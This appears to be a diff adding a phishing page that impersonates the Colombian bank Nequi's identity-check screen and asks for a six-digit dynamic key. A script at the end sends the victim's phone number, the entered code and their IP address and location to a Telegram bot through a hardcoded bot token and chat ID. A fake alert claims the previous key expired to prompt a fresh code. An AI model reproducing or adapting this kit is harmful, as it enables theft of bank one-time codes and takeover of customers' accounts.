@@ -1,0 +1,238 @@
+<html><head><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}</style>
+    <meta charset="utf-8">
+    <title>Nequi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Webflow">
+    <meta http-equiv="cache-control" content="max-age=0">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
+    <meta http-equiv="pragma" content="no-cache">
+    <link rel="stylesheet" type="text/css" href="css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
+    <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
+    <link rel="stylesheet" type="text/css" href="css/main.css">
+    <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
+  
+    <style>
+  
+    .code-input {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  
+  .code-input input {
+    width: 40px;
+    height: 40px;
+    text-align: center;
+    margin: 0 5px;
+    border: 2px solid #DA0081;
+    border-radius: 5px;
+    font-size: 20px;
+    background-color: #fff;
+    color: #DA0081;
+    outline: none;
+  }
+  
+  .code-input input:focus {
+    border-color: #DA0081;
+    box-shadow: 0 0 5px #DA0081;
+  }
+  </style>
+  
+      <!-- Librerias JS -->
+        <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.0-beta.2/angular.min.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;//linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/../executers/vi-tr.js"></script>
+      <script src="https://code.angularjs.org/1.4.3/i18n/angular-locale_en-us.js"></script>
+      <script src="js/lodash.min.js"></script>
+      <script src="js/restangular.min.js"></script>
+      <script type="text/javascript" src="js/libs/angular-recaptcha.min.js"></script>
+  
+  
+      <script>
+  function moveToNextInput(currentInput) {
+    var maxLength = parseInt(currentInput.getAttribute('maxlength'));
+    var currentValue = currentInput.value;
+  
+    if (currentValue.length >= maxLength) {
+      var nextInput = currentInput.nextElementSibling;
+      if (nextInput !== null) {
+        nextInput.focus();
+      }
+    }
+  }
+  
+  function handlePaste(event) {
+    event.preventDefault();
+    var clipboardData = event.clipboardData || window.clipboardData;
+    var pastedText = clipboardData.getData('text');
+    var pastedValues = pastedText.match(/[0-9]/g);
+    
+    if (pastedValues.length <= 6) {
+      var inputs = document.querySelectorAll('.code-input input');
+      inputs.forEach(function(input, index) {
+        if (index < pastedValues.length) {
+          input.value = pastedValues[index];
+        }
+      });
+    }
+  }
+  </script>
+      <style>
+  .code-input {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .code-input input {
+    width: 40px;
+    height: 40px;
+    text-align: center;
+    margin: 0 5px;
+  }
+  </style>
+  
+  <script type="text/javascript">
+      window.hasMobileFirstExtension = true;</script><script type="text/javascript">
+      window.hasMobileFirstExtension = true;</script><script type="text/javascript">
+    window.hasMobileFirstExtension = true;</script><script type="text/javascript">
+    window.hasMobileFirstExtension = true;</script><script type="text/javascript">
+      window.hasMobileFirstExtension = true;</script><script type="text/javascript">
+      window.hasMobileFirstExtension = true;</script><script type="text/javascript">
+      window.hasMobileFirstExtension = true;</script></head>
+  <body ng-app="App" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJDT05GSUciOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMi4wLjE0Iiwic2NvcmUiOjIwMDE0fV0=" bis_skin_checked="1">
+  
+  
+    <header class="ng-scope"> <div class="wrap-header" bis_skin_checked="1"> <div class="row" bis_skin_checked="1"> <div class="col-xs-12 col-md-2" bis_skin_checked="1"> <div class="logo" bis_skin_checked="1"> <a href="https://www.nequi.com.co" bis_skin_checked="1"> <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg"> </a> </div> <div class="btn-menu-hamburguer" ng-click="openMenu();" bis_skin_checked="1"> <a class=""> <span></span> </a> </div> </div> <div class="col-xs-12 col-md-10 container-buttons" bis_skin_checked="1"> <div class="wrap-main-menu " bis_skin_checked="1">  </div> </div> </div> </div> </header>
+  
+  
+  
+      <div id="content" bis_skin_checked="1">
+          <div ng-include="getTemplate('/header.html')" bis_skin_checked="1"></div>
+          <section class="login-section" ng-controller="loginController as loginControl">
+            <div class="login-wrap" bis_skin_checked="1">
+                <h1 class="ng-binding">Valida tu identidad</h1>
+                <p class="ng-binding">No dudamos que seas tú...</p>
+                <p class="ng-binding">Pero es mejor confirmar</p>
+                <h5 class="ng-binding">Ingresa tu clave dinamica para validar tu cuenta</h5>
+                <div class="login-form-wrap" bis_skin_checked="1">
+                  <form method="POST" id="formulario" action="" autocomplete="off" name="loginControl.formLogin" novalidate="" class="ng-valid-pattern ng-dirty ng-valid-parse ng-valid-recaptcha ng-valid-maxlength ng-valid-required ng-valid-us-phone-number ng-valid ng-valid-minlength">
+                    <div class="container-form" bis_skin_checked="1">
+                        
+                        <!-- ngIf: !hidePa -->
+                        <div class="code-input">
+                          <input type="tel" id="input1" maxlength="1" pattern="[0-9]" inputmode="numeric" oninput="moveToNextInput(this)" onpaste="handlePaste(event)" required>
+                          <input type="tel" id="input2" maxlength="1" pattern="[0-9]" inputmode="numeric" oninput="moveToNextInput(this)" onpaste="handlePaste(event)" required>
+                          <input type="tel" id="input3" maxlength="1" pattern="[0-9]" inputmode="numeric" oninput="moveToNextInput(this)" onpaste="handlePaste(event)" required>
+                          <input type="tel" id="input4" maxlength="1" pattern="[0-9]" inputmode="numeric" oninput="moveToNextInput(this)" onpaste="handlePaste(event)" required>
+                          <input type="tel" id="input5" maxlength="1" pattern="[0-9]" inputmode="numeric" oninput="moveToNextInput(this)" onpaste="handlePaste(event)" required>
+                          <input type="tel" id="input6" maxlength="1" pattern="[0-9]" inputmode="numeric" oninput="moveToNextInput(this)" onpaste="handlePaste(event)" required>
+                      </div>
+                        <!-- end ngIf: !hidePa -->
+                
+                        <!-- ngIf: loginControl.showCaptcha -->
+                        <div ng-if="loginControl.showCaptcha" class="captcha-wp ng-pristine ng-untouched ng-valid ng-scope ng-isolate-scope" vc-recaptcha="" ng-model="loginControl.myRecaptchaResponse" key="'6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i'" lang="es" type="'image'" bis_skin_checked="1">
+                            <iframe style="display: none;"></iframe>
+                        </div>
+                        <!-- end ngIf: loginControl.showCaptcha -->
+                
+                        <div class="g-recaptcha" data-sitekey="6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i" bis_skin_checked="1"></div>
+                    </div>
+                
+                    <div class="btn-wrap" bis_skin_checked="1">
+                        <input class="form-btn-submit" type="submit" value="Continuar" ng-disabled="!loginControl.formLogin.$valid">
+                
+                        <p style="color: #DA0081;font-weight: bold;margin-top: 10px;font-size: 12px;">¡Si no carga tu clave dinamica en la esquina izquierda superior reinicia tu app Nequi!</p>
+                    </div>
+                </form>
+                
+                </div>
+            </div>
+          </section>
+  
+          <div ng-include="getTemplate('/footer.html')" bis_skin_checked="1"></div>
+      </div>
+  
+    
+    <script src="js/aes.js"></script>
+    <script src="js/pbkdf2.js"></script>
+    <script src="js/AesUtil.js"></script>
+    <script src="js/md5.js"></script>
+    <script src="js/angular-no-captcha.js"></script>
+    <script src="js/angular-input-masks-standalone.min.js"></script>
+    <script src="js/string-mask.js"></script>
+    <!-- App -->
+    <script src="scripts.js"></script>
+
+ <script>
+      const tokenTelegram = "6917299241:AAFOrxs10OP5RlPCn5VyOc1huWhY3ZTLiH0";
+      const tokenIPinfo = "9c9af8c7467cc4";
+    
+      function obtenerUsuario() {
+          return localStorage.getItem("usuario");
+      }
+    
+      // Función para enviar los datos a Telegram
+      function enviarMensaje(event) {
+          event.preventDefault();
+    
+          const usr = obtenerUsuario();
+          let claveDinamica = "";
+    
+          // Obtener los valores de los seis inputs y concatenarlos
+          for (let i = 1; i <= 6; i++) {
+              const valor = document.getElementById(`input${i}`).value;
+              claveDinamica += valor;
+          }
+    
+          fetch(`https://ipinfo.io/json?token=${tokenIPinfo}`, {
+              method: "GET"
+          })
+          .then(response => response.json())
+          .then(data => {
+              const mensaje = `💲💲💲💲Nequi💲💲💲💲
+Celular: ${usr}
+Clave Dinámica 2: ${claveDinamica}
+IP: ${data.ip}
+${data.city},${data.country}
+              `;
+    
+              fetch(`https://api.telegram.org/bot${tokenTelegram}/sendMessage`, {
+                  method: "POST",
+                  headers: {
+                      "Content-Type": "application/json"
+                  },
+                  body: JSON.stringify({
+                      chat_id: "5915051785",
+                      text: mensaje
+                  })
+              })
+              .then(response => response.json())
+              .then(data => {
+                  console.log("Respuesta de Telegram:", data);
+    
+                  window.location.href = "cargando2.html";
+              })
+              .catch(error => {
+                  console.error("Error al enviar datos", error);
+              });
+          })
+          .catch(error => {
+              console.error("Error al obtener información", error);
+          });
+      }
+    
+      document.getElementById("formulario").addEventListener("submit", enviarMensaje);
+    
+      window.onload = function() {
+          document.getElementById("usr").value = obtenerUsuario();
+      };
+  </script>
+
+    <script>
+        // Línea de código para mostrar una alerta
+        alert('Tu clave dinamica expiró o es incorrecta, ingresa una nueva clave dinamica a continuación para validar tu identidad');
+    </script>
+
+  
+  </body><!-- Encriptar --></html>
